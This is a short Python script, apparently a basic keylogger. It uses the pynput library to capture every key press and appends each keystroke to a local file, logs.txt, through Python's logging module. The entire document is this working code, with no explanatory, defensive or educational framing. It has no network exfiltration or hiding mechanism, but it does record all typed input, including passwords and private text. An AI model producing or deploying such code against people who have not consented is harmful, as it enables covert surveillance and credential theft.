from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='[%(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()